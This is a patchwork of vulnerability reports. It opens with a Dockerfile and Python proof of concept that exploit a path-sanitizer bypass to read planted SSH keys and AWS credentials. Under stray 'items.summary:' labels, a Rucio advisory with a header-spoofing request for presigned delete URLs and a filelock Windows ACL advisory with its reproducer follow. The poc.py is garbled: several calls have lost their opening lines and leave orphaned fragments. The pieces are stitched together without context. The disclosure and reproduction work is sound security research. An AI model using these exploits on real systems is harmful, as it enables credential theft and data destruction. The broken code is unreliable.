FROM node:20-slim

LABEL vuln="VULN-002" \
      cwe="CWE-22" \
      title="mcp-sanitizer home-directory path bypass"

# Install mcp-sanitizer production dependencies
WORKDIR /app/repo
COPY repo/package.json repo/package-lock.json ./
RUN npm ci --omit=dev --no-audit --no-fund

# Copy mcp-sanitizer source code
COPY repo/src ./src

# Create simulated victim home directory with sensitive files
# These represent secrets a real attacker would target
RUN mkdir -p /home/victim/.ssh /home/victim/.aws
RUN echo '-----BEGIN RSA PRIVATE KEY-----'                                 > /home/victim/.ssh/id_rsa && \
    echo 'MIIEowIBAAKCAQEA0Z3VS5JJcds3xHnygWep4PAtEsHABkxFQnPmcEDLXdK'  >> /home/victim/.ssh/id_rsa && \
    echo 'SECRET_KEY_CONTENT_EXFILTRATED_VIA_HOME_PATH_BYPASS_VULN002'    >> /home/victim/.ssh/id_rsa && \
    echo 'CVE_VULN002_SANITIZER_ALLOWS_HOME_DIRECTORY_ABSOLUTE_PATHS'     >> /home/victim/.ssh/id_rsa && \
    echo '-----END RSA PRIVATE KEY-----'                                   >> /home/victim/.ssh/id_rsa && \
    chmod 600 /home/victim/.ssh/id_rsa
RUN echo '[default]'                                                        > /home/victim/.aws/credentials && \
    echo 'aws_access_key_id = AKIAIOSFODNN7EXAMPLE'                       >> /home/victim/.aws/credentials && \
    echo 'aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY' >> /home/victim/.aws/credentials && \
    echo 'region = us-east-1'                                              >> /home/victim/.aws/credentials && \
    chmod 600 /home/victim/.aws/credentials

# Copy the consumer server application
WORKDIR /app
COPY server.js ./server.js

EXPOSE 3000

CMD ["node", "server.js"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
VULN-002 Dynamic Reproduction PoC
mcp-sanitizer v1.3.3 — File path sanitizer permits arbitrary user-home absolute paths (CWE-22)

Vulnerability:
    src/utils/validation-utils.js:188-196 explicitly whitelists '/home/' and '/Users/'
    as allowed absolute path prefixes. A path like /home/victim/.ssh/id_rsa passes
    sanitizer.sanitize(path, {type: 'file_path'}) with blocked=false, and the consumer
    app reads the file using the trusted sanitized path.

Attack chain:
    1. Attacker sends POST /tool with file_path=/home/victim/.ssh/id_rsa
    2. sanitizer.sanitize() returns {blocked: false, sanitized: '/home/victim/.ssh/id_rsa'}
    3. Consumer app calls fs.readFile(sanitized_path) — trusting the sanitizer
    4. SSH private key contents returned in HTTP response (exfiltrated)

Usage:
    python3 poc.py
"""

import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import urllib.request
import urllib.error

# Paths
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
REPO_DIR = os.path.abspath(os.path.join(SCRIPT_DIR, "..", "repo"))
PHASE2_RESULT = os.path.join(SCRIPT_DIR, "phase2_result.json")

# Docker settings
IMAGE_NAME = "vuln002-mcp-sanitizer-poc"
CONTAINER_NAME = "vuln002-poc-container"
HOST_PORT = 13572  # High port to avoid conflicts

BASE_URL = f"http://127.0.0.1:{HOST_PORT}"
TOOL_URL = f"{BASE_URL}/tool"
HEALTH_URL = f"{BASE_URL}/health"


def log(msg):
    print(f"[poc] {msg}", flush=True)


def save_result(passed, verdict, reason, evidence, build_cmd, run_cmd):
    result = {
        "passed": passed,
        "verdict": verdict,
        "reason": reason,
        "build_command": build_cmd,
        "run_command": run_cmd,
        "poc_command": "python3 poc.py",
        "evidence": evidence,
        "artifacts": ["Dockerfile", "poc.py", "server.js"]
    }
    with open(PHASE2_RESULT, "w", encoding="utf-8") as f:
        json.dump(result, f, indent=2, ensure_ascii=False)
    log(f"Saved phase2_result.json (verdict={verdict})")


def run(cmd, timeout=300, capture=True):
    """Run a subprocess command and return (returncode, stdout, stderr)."""
    result = subprocess.run(
        cmd, capture_output=capture, text=True, timeout=timeout
    )
    return result.returncode, result.stdout, result.stderr


def stop_container():
    subprocess.run(
        ["docker", "rm", "-f", CONTAINER_NAME],
        capture_output=True, timeout=15
    )


def http_post(url, payload, timeout=8):
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        url, data=data,
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return json.loads(resp.read().decode("utf-8"))


def http_get(url, timeout=5):
    with urllib.request.urlopen(url, timeout=timeout) as resp:
        return json.loads(resp.read().decode("utf-8"))


def wait_for_server(max_wait=40):
    log(f"Polling {HEALTH_URL} until ready (max {max_wait}s)...")
    deadline = time.monotonic() + max_wait
    while time.monotonic() < deadline:
        try:
            resp = http_get(HEALTH_URL)
            if resp.get("ok"):
                log("Server is up and responding.")
                return True
        except Exception:
            pass
        time.sleep(0.6)
    return False


def prepare_build_context():
    """
    Create a temporary Docker build context containing:
      build_ctx/
        Dockerfile
        server.js
        repo/
          package.json
          package-lock.json
          src/
    """
    build_ctx = tempfile.mkdtemp(prefix="vuln002-ctx-")
    log(f"Build context directory: {build_ctx}")

    # Copy Dockerfile and server.js from this script's directory
    for fname in ("Dockerfile", "server.js"):
        src = os.path.join(SCRIPT_DIR, fname)
        dst = os.path.join(build_ctx, fname)
        shutil.copy2(src, dst)
        log(f"  Copied {fname}")

    # Copy only the necessary repo files (skip node_modules to keep context small)
    repo_dst = os.path.join(build_ctx, "repo")
    os.makedirs(repo_dst)
    shutil.copy2(os.path.join(REPO_DIR, "package.json"), repo_dst)
    shutil.copy2(os.path.join(REPO_DIR, "package-lock.json"), repo_dst)
    shutil.copytree(
        os.path.join(REPO_DIR, "src"),
        os.path.join(repo_dst, "src")
    )
    log(f"  Copied repo/src and package files")

    return build_ctx


def main():
    log("=" * 60)
    log("VULN-002 Dynamic Reproduction — mcp-sanitizer /home/* bypass")
    log("=" * 60)

    # Validate prerequisites
    if not os.path.isdir(REPO_DIR):
        log(f"ERROR: Repo not found at {REPO_DIR}")
        save_result(False, "FAIL",
                    f"재현 전제조건 미충족: repo 디렉터리({REPO_DIR})가 존재하지 않음.",
                    "", "", "")
        return 1

    rc, _, _ = run(["docker", "info"], timeout=10)
    if rc != 0:
        log("ERROR: Docker daemon is not accessible.")
        save_result(False, "FAIL",
                    "Docker 데몬에 접근할 수 없음. Docker가 실행 중인지 확인하시오.",
                    "", "", "")
        return 1

    # Clean up any leftover container from a previous run
    stop_container()

    build_ctx = None
    try:
        # Step 1: Prepare build context
        build_ctx = prepare_build_context()

        # Step 2: Build Docker image
        build_cmd = f"docker build -t {IMAGE_NAME} {build_ctx}"
        log(f"Building Docker image: {build_cmd}")
        rc, stdout, stderr = run(
            ["docker", "build", "-t", IMAGE_NAME, build_ctx],
            timeout=300
        )
        if rc != 0:
            err_tail = (stdout + stderr)[-600:]
            log(f"Docker build FAILED (rc={rc}):\n{err_tail}")
            save_result(False, "FAIL",
                        f"Docker 이미지 빌드 실패 (exit code {rc}). "
                        f"'npm ci --omit=dev' 실패 또는 Dockerfile 오류 가능성. "
                        f"마지막 출력: {err_tail[-200:]}",
                        err_tail,
                        build_cmd,
                        f"docker run --rm -p {HOST_PORT}:3000 {IMAGE_NAME}")
            return 1
        log("Docker image built successfully.")

        # Step 3: Run container in detached mode
        run_cmd = f"docker run --rm --name {CONTAINER_NAME} -p {HOST_PORT}:3000 -d {IMAGE_NAME}"
        log(f"Starting container: {run_cmd}")
        rc, stdout, stderr = run(
            ["docker", "run", "--rm", "--name", CONTAINER_NAME,
             "-p", f"{HOST_PORT}:3000", "-d", IMAGE_NAME],
            timeout=30
        )
        if rc != 0:
            log(f"docker run FAILED:\n{stderr}")
            save_result(False, "FAIL",
                        f"컨테이너 실행 실패 (exit code {rc}): {stderr[-300:]}",
                        stderr[-300:],
                        build_cmd, run_cmd)
            return 1
        container_id = stdout.strip()
        log(f"Container started: {container_id[:12]}")

        # Step 4: Wait for HTTP server inside container
        if not wait_for_server():
            # Collect container logs for diagnosis
            _, clog, _ = run(["docker", "logs", CONTAINER_NAME], timeout=10)
            log(f"Container logs:\n{clog}")
            save_result(False, "FAIL",
                        f"서버가 {HOST_PORT} 포트에서 제한 시간 내 응답하지 않음. "
                        f"컨테이너 로그: {clog[-300:]}",
                        clog[-300:],
                        build_cmd, run_cmd)
            stop_container()
            return 1

        # ----------------------------------------------------------------
        # Step 5: Test 1 — Control: /etc/passwd must be BLOCKED
        # ----------------------------------------------------------------
        log("-" * 50)
        log("TEST 1 (control): file_path=/etc/passwd  [expected: blocked=true]")
        try:
            r_ctrl = http_post(TOOL_URL, {
                "tool_name": "file_reader",
                "parameters": {"file_path": "/etc/passwd"}
            })
        except Exception as exc:
            r_ctrl = {"_request_error": str(exc)}
        log(f"  Response: {json.dumps(r_ctrl)[:300]}")
        ctrl_blocked = r_ctrl.get("blocked", False)

        # ----------------------------------------------------------------
        # Step 6: Test 2 — Exploit: /home/victim/.ssh/id_rsa must PASS
        # ----------------------------------------------------------------
        log("-" * 50)
        log("TEST 2 (exploit): file_path=/home/victim/.ssh/id_rsa  [expected: blocked=false + file content]")
        try:
            r_ssh = http_post(TOOL_URL, {
                "tool_name": "file_reader",
                "parameters": {"file_path": "/home/victim/.ssh/id_rsa"}
            })
        except Exception as exc:
            r_ssh = {"_request_error": str(exc)}
        log(f"  Response: {json.dumps(r_ssh)[:400]}")

        # ----------------------------------------------------------------
        # Step 7: Test 3 — Exploit: /home/victim/.aws/credentials must PASS
        # ----------------------------------------------------------------
        log("-" * 50)
        log("TEST 3 (exploit): file_path=/home/victim/.aws/credentials  [expected: blocked=false + AWS creds]")
        try:
            r_aws = http_post(TOOL_URL, {
                "tool_name": "file_reader",
                "parameters": {"file_path": "/home/victim/.aws/credentials"}
            })
        except Exception as exc:
            r_aws = {"_request_error": str(exc)}
        log(f"  Response: {json.dumps(r_aws)[:400]}")

        # ----------------------------------------------------------------
        # Step 8: Evaluate results
        # ----------------------------------------------------------------
        log("-" * 50)
        log("Evaluating results...")

        ssh_bypassed = (
            not r_ssh.get("blocked", True) and
            r_ssh.get("EXPLOIT_SUCCESS") is True and
            "id_rsa" in r_ssh.get("sanitized_path", "") and
            bool(r_ssh.get("file_content")) and
            "RSA" in r_ssh.get("file_content", "")
        )

        aws_bypassed = (
            not r_aws.get("blocked", True) and
            r_aws.get("EXPLOIT_SUCCESS") is True and
            "credentials" in r_aws.get("sanitized_path", "") and
            bool(r_aws.get("file_content")) and
            "aws_access_key_id" in r_aws.get("file_content", "")
        )

        log(f"  [control] /etc/passwd blocked={ctrl_blocked}")
        log(f"  [exploit] SSH key bypass={ssh_bypassed}")
        log(f"  [exploit] AWS creds bypass={aws_bypassed}")

        # PASS requires: control is blocked AND at least SSH bypass confirmed
        if ctrl_blocked and ssh_bypassed:
            ssh_content = r_ssh.get("file_content", "")
            aws_content = r_aws.get("file_content", "")

            evidence = (
                f"[Test 1 — Control] POST /tool {{file_path: '/etc/passwd'}} "
                f"=> blocked=true (dangerousUnixPaths가 /etc/를 올바르게 차단)\n\n"
                f"[Test 2 — Exploit] POST /tool {{file_path: '/home/victim/.ssh/id_rsa'}} "
                f"=> blocked=false, EXPLOIT_SUCCESS=true\n"
                f"  sanitized_path: {r_ssh.get('sanitized_path')}\n"
                f"  file_content (truncated):\n"
                f"    {ssh_content[:300]}\n\n"
                f"[Test 3 — Exploit] POST /tool {{file_path: '/home/victim/.aws/credentials'}} "
                f"=> blocked={r_aws.get('blocked', True)}, "
                f"EXPLOIT_SUCCESS={r_aws.get('EXPLOIT_SUCCESS')}\n"
                f"  file_content: {aws_content[:200]}\n\n"
                f"[Root Cause] validation-utils.js:190 — "
                f"allowedAbsolutePaths includes '/home/' and '/Users/': "
                f"any absolute path starting with /home/ passes with blocked=false."
            )

            reason = (
                "/home/ prefix가 allowedAbsolutePaths 화이트리스트에 포함되어 있어 "
                "/home/victim/.ssh/id_rsa 경로가 sanitizer.sanitize()에서 blocked=false로 반환됨. "
                "소비 앱이 해당 경로로 fs.readFile을 호출하여 SSH 개인키 내용이 HTTP 응답으로 유출됨. "
                "CWE-22 경로 제한 우회 취약점 동적 재현 완료 (컨테이너 내 관측 가능한 파일 유출 확인)."
            )

                f"docker build -t {IMAGE_NAME} <build_ctx>",
                f"docker run --rm -p {HOST_PORT}:3000 {IMAGE_NAME}"
            )
            log("=== FINAL VERDICT: PASS ===")
            return 0

        else:
            # Record failure details
            evidence = (
                f"[Test 1] ctrl response: {json.dumps(r_ctrl)[:300]}\n"
                f"[Test 2] ssh response:  {json.dumps(r_ssh)[:300]}\n"
                f"[Test 3] aws response:  {json.dumps(r_aws)[:300]}\n"
                f"ctrl_blocked={ctrl_blocked}, ssh_bypassed={ssh_bypassed}, aws_bypassed={aws_bypassed}"
            )

                    "/etc/passwd 경로가 예상과 달리 차단되지 않았음. "
                    "서버 초기화 오류 또는 취약점 패치 가능성. 서버 로그를 확인하시오."
                )

                    f"/home/victim/.ssh/id_rsa bypass 미확인 (ssh_bypassed={ssh_bypassed}). "
                    f"응답: {json.dumps(r_ssh)[:200]}. "
                    "서버 응답 구조 또는 파일 생성 확인 필요. "

                        f"docker build -t {IMAGE_NAME} <build_ctx>",
                        f"docker run --rm -p {HOST_PORT}:3000 {IMAGE_NAME}")
            log("=== FINAL VERDICT: FAIL ===")
            return 1

    except KeyboardInterrupt:
        log("Interrupted by user.")
        return 1
    except Exception as exc:
        import traceback
        tb = traceback.format_exc()
        log(f"Unexpected error: {exc}\n{tb}")

                    f"예상치 못한 오류 발생: {exc}. "

                    tb[-600:], "", "")
        return 1
    finally:
        stop_container()
        if build_ctx and os.path.isdir(build_ctx):
            shutil.rmtree(build_ctx, ignore_errors=True)
```

items.summary:
## Summary
The `/credentials/signurl` endpoint decides authorization from the client-supplied `X-Rucio-Account` HTTP header instead of the authenticated token's account. Any client holding **any** valid auth token (even a low-privilege account they legitimately own) can send `X-Rucio-Account: root` to pass the root-only permission check and have the Rucio server mint a presigned **read / write / delete** URL for an **arbitrary** object, signed with the RSE's stored S3 / GCS / Swift credentials.

## Details
`SignURL.get()` takes the authorization principal from a request header and
never uses the token-authenticated identity:

```python
# lib/rucio/web/rest/flaskapi/v1/credentials.py
account = request.headers.get('X-Rucio-Account', default=None)     # L165  (attacker-controlled)
...
result = get_signed_url(account, rse=rse, service=service,         # L194
                        operation=operation, url=url, lifetime=lifetime, vo=vo)
```

The gateway then uses that header value as the `issuer` for the permission check:

```python
# lib/rucio/gateway/credential.py
auth_result = permission.has_permission(issuer=account, vo=vo,     # L57
                                        action='get_signed_url', kwargs=kwargs, ...)
```

and the permission function is root-only:

```python
# lib/rucio/core/permission/generic.py
def perm_get_signed_url(issuer, kwargs, session):
    return _is_root(issuer)        # _is_root(x) -> x.external == 'root'
```

`InternalAccount('root', vo).external == 'root'` unconditionally, so the gate passes whenever the header is `root`. The endpoint is on `AuthenticatedBlueprint`, whose `before_request` hook validates the token and sets `request.environ['issuer']` **from the token** — but nothing ever compares `X-Rucio-Account` to it:

```python
# lib/rucio/web/rest/flaskapi/v1/common.py  (request_auth_env)
flask.request.environ['issuer'] = auth.get('account')             # L168  (the real account; unused by SignURL)
```

This is anomalous: every other authenticated handler derives the account from `request.environ['issuer']`; `credentials.py` is the only one that trusts the header. Additionally, `core.credential.get_signed_url` never checks that the supplied `url`'s host/bucket belongs to the target RSE, so even a legitimate `root` caller gets an arbitrary-object signing oracle. In multi-VO the VO is also read from the `X-Rucio-VO` header, allowing cross-tenant targeting.

## Proof of concept
Request (any valid token + spoofed account):
```
GET /credentials/signurl?rse=<cloudRSE>&svc=s3&op=delete&url=https://victim-bucket.s3.amazonaws.com/important/dataset.root HTTP/1.1
X-Rucio-Auth-Token: <any valid token, even a low-privilege account>
X-Rucio-Account: root
Accept: application/octet-stream
```
Response: `200 OK` with a presigned DELETE URL the attacker replays directly against the storage backend.

## Impact
A low-privilege Rucio user can read, overwrite, and delete arbitrary objects on any cloud-backed (S3/GCS/Swift) RSE using the server's stored credentials — enabling data exfiltration, tampering, and destruction, and cross-tenant access in multi-VO deployments.

## Credit
Reported by seankohjs. Found via static analysis + manual verification.

items.summary:
filelock on Windows ignores the `mode` argument. `FileLock(path, mode=0o600)` creates the same file as `FileLock(path)`: one with no security descriptor of its own (the Windows record that says who may access a file). Its access list, or ACL, is whatever the lock directory hands down to new files. filelock creates the `ReadWriteLock` database, which it asks to be `0o600`, the same way. In a directory whose inheritable ACL grants other local accounts access to new files, those accounts can open the lock file or database. They can take the byte-range lock (a lock on a span of bytes in a file) once the owner releases it and keep the owner's later `acquire()` calls waiting or timing out. They can read holder metadata an `on_acquired` hook left in a `preserve_lock_file=True` file. Where the directory hands down modify access, they can write to both files.

`lock.mode` still reports `0o600`. The documentation neither promises an ACL on Windows nor says that Windows drops the mode. On Unix the same mode keeps other accounts out. Mutual exclusion between processes that follow the protocol holds on either platform. Affected versions are filelock 3.10.0 through 4.2.0 on Windows.

Anthropic's OSS Scanner reported this in private. Finding covered by this advisory:

- `ANT-2026-0KEO0DDO` [medium, CWE-732]: WindowsFileLock ignores mode; 0o600 lock files inherit the directory ACL.

## Severity

**CVSS 3.1 `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L` scores 5.3 (Medium).**

`AV:L` (local): the other account needs a logon on the same host. `PR:L` (low privileges): an ordinary account is enough. `UI:N` (no user interaction). `AC:L` (low attack complexity): no race. `C:L` (partial confidentiality impact): the lock file (holder metadata) and the lock database are readable where `0o600` was meant to keep them private. `I:L` (partial integrity impact): in the directory layout the maintainers tested, the other account can also write both files, which lets it corrupt the lock's own state but nothing the lock protects. `A:L` (partial availability impact): the other account can hold the byte-range lock and make the owner wait or time out. `S:U` (scope unchanged).

Classification from the review: **Windows permission failure with security impact only where callers rely on `mode=0o600` across accounts**. The review had marked it an unconfirmed Windows claim, since the scanner traced stand-in Win32 calls on Linux. The maintainers have since confirmed it on Windows with two local accounts (see Evidence). The scanner rated this medium; the maintainers keep medium.

## Scope and preconditions

- The affected classes are `FileLock` and `AsyncFileLock` on Windows (`WindowsFileLock`), and the SQLite database of `ReadWriteLock` and `AsyncReadWriteLock`. Both go through `_open_non_reparse_fd`. The soft locks create their markers with `os.open`, which also keeps only a read-only bit of the mode on Windows; the scanner did not examine them further.
- The directory is one that other local accounts cannot write, which the documentation already requires on Windows, but whose inheritable entries grant them read (or modify) access to new files. Examples are a service's data directory readable by `Users`, or any directory with `(OI)(CI)` entries (entries that new files and sub-directories inherit) for another account. A directory whose ACL already excludes other accounts, such as one inside a user profile, hides the problem.
- The other account must open the file. According to the `LockFileEx` documentation, read access is enough to take the byte-range lock, so it can hold the lock whenever the owner does not. The lock file exists while the owner holds the lock, and stays after release with `preserve_lock_file=True`. The `ReadWriteLock` database is not unlinked at any point.
- Unix is not affected, because `UnixFileLock` creates the file with the mode and repeats it with `fchmod`. Mutual exclusion between cooperating processes is not affected.

## Affected code

Scanned commit `b831496b0273`: [`_open_non_reparse_fd` reduces the mode to one `read_only` bit](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_windows.py#L252-L253). That bit is false for every accepted mode, because [`_check_mode`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_api.py#L526) rejects any mode without owner read and write, and an unset mode becomes `0o666`. In [`_nt_open`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_windows.py#L283-L310) the `OBJECT_ATTRIBUTES.SecurityDescriptor` field stays unassigned, and `read_only` only chooses `FILE_ATTRIBUTE_READONLY`. [`_open_lock_database`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1079-L1086) passes `0o600` through the same function on Windows.

## Introduced

[d0061e4](https://github.com/tox-dev/filelock/commit/d0061e4643df) "added multiuser support and associated tests" ([#192](https://github.com/tox-dev/filelock/pull/192), 2023-03-15), first tag 3.10.0 (verified), added the `mode` parameter and on Windows handed it to `os.open`, which applies only the read-only attribute. The Windows backend has applied no more of the mode than that at any version, so this is a long-standing gap rather than a regression.

## Mechanism

`_open_non_reparse_fd(path, mode)` computes `read_only = not mode & _OWNER_WRITE` and calls `_nt_open(path, read_only=read_only)`. `_nt_open` fills an `OBJECT_ATTRIBUTES` with the NT path and `OBJ_CASE_INSENSITIVE` and leaves `SecurityDescriptor` NULL. It then calls `NtCreateFile` with `FILE_OPEN_IF` and `FILE_ATTRIBUTE_NORMAL` (or `FILE_ATTRIBUTE_READONLY` when `read_only`, which no accepted mode produces). Nothing consults the group and other bits. Per the `NtCreateFile` and `OBJECT_ATTRIBUTES` documentation, a NULL descriptor gives the new file default security, which on NTFS is the set of inheritable entries of the parent directory. A lock file created with `mode=0o600` in a directory that hands down read access to `Users` is therefore readable by `Users`.

Nothing tells the caller. The constructor validates the mode, `lock.mode` returns `0o600`, and `has_explicit_mode` is `True`. `docs/concepts.rst` says "filelock creates the file with it" and that "`0o600` and `0o700` keep other UIDs out", with no Windows caveat. Only the `_open_non_reparse_fd` docstring and a comment in `_soft.py` record the limitation.

## Reproduction

The scanner's reproducer for `ANT-2026-0KEO0DDO`, quoted as received. It ran against commit `b831496b0273`.

**`repro`**

```python
#!/usr/bin/env python3
import os
import shutil
import subprocess
import sys
import tempfile

private_job = "/tmp/repro.d/job_with_private_lock.py"  # with FileLock(path, mode=0o600)
default_job = "/tmp/repro.d/job_with_default_lock.py"  # with FileLock(path)
on_windows_backend = "/tmp/repro.d/run_on_windows_backend.py"  # prints every Win32 call filelock makes

os.umask(0o022)
locks = tempfile.mkdtemp()

# control: UnixFileLock, which leaves the lock file behind
subprocess.run([sys.executable, private_job, f"{locks}/private.lock"], check=True)
subprocess.run([sys.executable, default_job, f"{locks}/default.lock"], check=True)
unix_private_mode = os.stat(f"{locks}/private.lock").st_mode & 0o777
unix_default_mode = os.stat(f"{locks}/default.lock").st_mode & 0o777

# trigger: the same two programs on WindowsFileLock, same lock name so the call lists can be compared whole
windows_private = [sys.executable, on_windows_backend, private_job, f"{locks}/job.lock"]
windows_default = [sys.executable, on_windows_backend, default_job, f"{locks}/job.lock"]
windows_private_calls = subprocess.run(windows_private, check=True, capture_output=True, text=True).stdout.splitlines()
windows_default_calls = subprocess.run(windows_default, check=True, capture_output=True, text=True).stdout.splitlines()
shutil.rmtree(locks)

# check: mode=0o600 must reach the OS; on Windows that means a security descriptor on NtCreateFile
print(f"CONTROL  UnixFileLock FileLock(path, mode=0o600): lock file mode {unix_private_mode:#o}")
print(f"CONTROL  UnixFileLock FileLock(path):             lock file mode {unix_default_mode:#o}")
for call in windows_private_calls:
    print(f"OBSERVED WindowsFileLock FileLock(path, mode=0o600): {call}")
for call in windows_default_calls:
    print(f"OBSERVED WindowsFileLock FileLock(path):             {call}")
print(f"OBSERVED the two Win32 call lists are identical: {windows_private_calls == windows_default_calls}")

honoured_on_unix = unix_private_mode == 0o600 and unix_default_mode == 0o644
private_create = next(call for call in windows_private_calls if call.startswith("NtCreateFile("))
dropped_on_windows = (
    "ObjectAttributes.SecurityDescriptor=None" in private_create
    and windows_private_calls == windows_default_calls
)
print("BUG" if honoured_on_unix and dropped_on_windows else "OK")
```

**`repro.d/job_with_default_lock.py`**

```python
import sys

from filelock import FileLock

with FileLock(sys.argv[1]):
    pass
```

**`repro.d/job_with_private_lock.py`**

```python
import sys

from filelock import FileLock

with FileLock(sys.argv[1], mode=0o600):
    pass
```

**`repro.d/run_on_windows_backend.py`**

```python
import ctypes
import fcntl
import os
import runpy
import sys
import types

# Stand-ins for the ntdll, kernel32 and msvcrt functions filelock's Windows backend calls. Each prints the call with
# the arguments filelock passed, then does the nearest Linux thing so the program runs to its end.


def RtlDosPathNameToNtPathName_U_WithStatus(dos_path, nt_name, _file_part, _relative_name):
    print(f"RtlDosPathNameToNtPathName_U_WithStatus({os.path.basename(dos_path)!r})")
    nt_name._obj.Buffer = os.path.abspath(dos_path)
    return 0  # STATUS_SUCCESS


def NtCreateFile(
    handle, access, attributes, _io_status, allocation_size, file_attributes, share, disposition, options, ea, ea_length
):
    object_attributes = attributes._obj
    print(
        f"NtCreateFile(DesiredAccess={access:#x},"
        f" ObjectAttributes.Attributes={object_attributes.Attributes:#x},"
        f" ObjectAttributes.SecurityDescriptor={object_attributes.SecurityDescriptor},"
        f" AllocationSize={allocation_size}, FileAttributes={file_attributes:#x}, ShareAccess={share:#x},"
        f" CreateDisposition={disposition}, CreateOptions={options:#x}, EaBuffer={ea}, EaLength={ea_length})"
    )
    path = object_attributes.ObjectName.contents.Buffer
    handle._obj.value = os.open(path, os.O_RDWR | os.O_CREAT | os.O_NOFOLLOW)
    return 0  # STATUS_SUCCESS


def RtlFreeUnicodeString(_nt_name):
    print("RtlFreeUnicodeString()")


def GetFileInformationByHandle(_handle, info):
    print("GetFileInformationByHandle()")
    info._obj.dwFileAttributes = 0x80  # FILE_ATTRIBUTE_NORMAL: not a reparse point
    return True


def LockFileEx(handle, flags, _reserved, bytes_low, bytes_high, _overlapped):
    print(f"LockFileEx(dwFlags={flags:#x}, nNumberOfBytesToLockLow={bytes_low}, nNumberOfBytesToLockHigh={bytes_high})")
    fcntl.flock(handle, fcntl.LOCK_EX)
    return True


def UnlockFileEx(handle, _reserved, bytes_low, bytes_high, _overlapped):
    print(f"UnlockFileEx(nNumberOfBytesToUnlockLow={bytes_low}, nNumberOfBytesToUnlockHigh={bytes_high})")
    fcntl.flock(handle, fcntl.LOCK_UN)
    return True


# only a filelock that builds a security descriptor for the lock file calls this
def ConvertStringSecurityDescriptorToSecurityDescriptorW(sddl, _revision, descriptor, _size):
    print(f"ConvertStringSecurityDescriptorToSecurityDescriptorW({sddl!r})")
    descriptor._obj.value = 1  # any address but NULL
    return True


# filelock sets argtypes on these at import; a lock taken without contention never calls them
def not_called(*_arguments):
    raise NotImplementedError


dlls = {
    "ntdll": types.SimpleNamespace(
        RtlDosPathNameToNtPathName_U_WithStatus=RtlDosPathNameToNtPathName_U_WithStatus,
        NtCreateFile=NtCreateFile,
        RtlFreeUnicodeString=RtlFreeUnicodeString,
        RtlNtStatusToDosError=not_called,
    ),
    "kernel32": types.SimpleNamespace(
        GetFileInformationByHandle=GetFileInformationByHandle,
        LockFileEx=LockFileEx,
        UnlockFileEx=UnlockFileEx,
        CloseHandle=not_called,
        OpenProcess=not_called,
        GetProcessTimes=not_called,
    ),
    "advapi32": types.SimpleNamespace(
        ConvertStringSecurityDescriptorToSecurityDescriptorW=ConvertStringSecurityDescriptorToSecurityDescriptorW,
    ),
}

# Import filelock once on the real platform, so the standard library modules it uses load their Linux versions, then
# drop it and import it again with the Windows branches active. A HANDLE is the Linux descriptor number.
import filelock  # noqa: E402

for name in [name for name in sys.modules if name.split(".")[0] == "filelock"]:
    del sys.modules[name]

ctypes.WinDLL = lambda name, use_last_error=False: dlls[name]
sys.modules["msvcrt"] = types.SimpleNamespace(open_osfhandle=lambda handle, _flags: handle, get_osfhandle=lambda fd: fd)
os.O_NOINHERIT = 0
sys.platform = "win32"

import filelock  # noqa: E402, F811

assert filelock.FileLock is filelock.WindowsFileLock

sys.argv = sys.argv[1:]
runpy.run_path(sys.argv[0], run_name="__main__")
```

## Failure sequence

```mermaid
sequenceDiagram
    participant O as owner process: FileLock(path, mode=0o600)
    participant N as NtCreateFile
    participant F as lock file (inherits the directory ACL)
    participant U as other local account
    O->>N: _open_non_reparse_fd(path, 0o600): read_only=False, SecurityDescriptor=NULL
    rect rgb(255, 214, 214)
        N-->>F: created with the parent's inheritable entries only, group and other bits not consulted
        Note over F: the file reports mode 0o600 to the owner, the ACL says otherwise
    end
    O->>F: LockFileEx (holds the lock), release, unlock
    U->>F: open for read (and write, where the directory hands down modify)
    U->>F: LockFileEx through that handle
    O->>F: acquire() -> waits or Timeout while U holds the byte-range lock
    U->>F: read holder metadata left by on_acquired with preserve_lock_file=True
```

## Evidence

The scanner's reproducer runs on a Linux image. It imports filelock's unmodified Windows backend with `sys.platform == "win32"` over stand-ins that print every Win32 call. The program with `mode=0o600` and the one without produce identical call lists (`RtlDosPathNameToNtPathName_U_WithStatus`, `NtCreateFile` with `FileAttributes=0x80` and `ObjectAttributes.SecurityDescriptor=None`, `RtlFreeUnicodeString`, `GetFileInformationByHandle`, `LockFileEx`, `UnlockFileEx`), while the Unix control produced `0o600` and `0o644` files. It prints `OBSERVED the two Win32 call lists are identical: True` and `BUG`. The scanner stated that it inferred the resulting ACL, and what another user can then do, from the documentation and did not run on Windows.

Maintainer triage: the stand-in reproducer prints `BUG` on the scanned commit `b831496` and on the 4.2.0 release image.

Maintainer verification on Windows 11 with two local accounts: a script creates `private.lock` with `FileLock(mode=0o600, preserve_lock_file=True)`, `default.lock` without a mode, and a `ReadWriteLock` database `lock.db` as the first account, in a directory granted `(OI)(CI)(M)` to a second account that is a member of `Users`. It then opens each file under the second account's logon token with `LogonUserW` and `ImpersonateLoggedOnUser`. On 4.2.0 the second account could open `private.lock` and `lock.db` for both read and write, the same as `default.lock`, and `icacls` listed only inherited `(I)` entries on all three. This confirms the claim the review had marked unconfirmed.

## Impact

A program that passes `mode=0o600` so that other accounts cannot open its lock file gets no such restriction on Windows. In a directory that hands down read access, another account can hold the lock and make the owner wait or time out, and read holder metadata in a preserved lock file. Where the directory hands down modify access, as in the maintainers' test, it can also write the lock file and the `ReadWriteLock` database. With the mode honoured, as on Unix, a user without write access to the directory can do none of this. The exposure ends there: the effect reaches only the lock file or lock database, and mutual exclusion between processes that follow the protocol still holds.

## Workarounds

- On Windows, keep lock files and `ReadWriteLock` databases in a directory whose ACL already excludes other accounts (inside the user profile, or a directory with inheritance disabled and only the owner, `SYSTEM` and `Administrators` granted), rather than relying on `mode`.
